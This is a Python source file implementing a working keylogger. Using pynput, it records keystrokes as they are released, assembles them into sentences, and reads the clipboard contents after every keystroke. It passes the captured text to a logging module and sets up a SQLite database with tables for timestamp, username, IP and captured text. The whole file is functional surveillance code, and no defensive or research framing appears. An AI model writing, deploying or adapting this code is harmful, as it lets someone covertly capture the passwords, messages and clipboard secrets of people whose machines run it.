import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = "keylogs.db"


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """
    )
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        log_sentence("".join(buffer))
        buffer = []


def on_release(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append(" ")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f"Error logging keystroke: {e}")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f"Error capturing clipboard: {e}")


# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
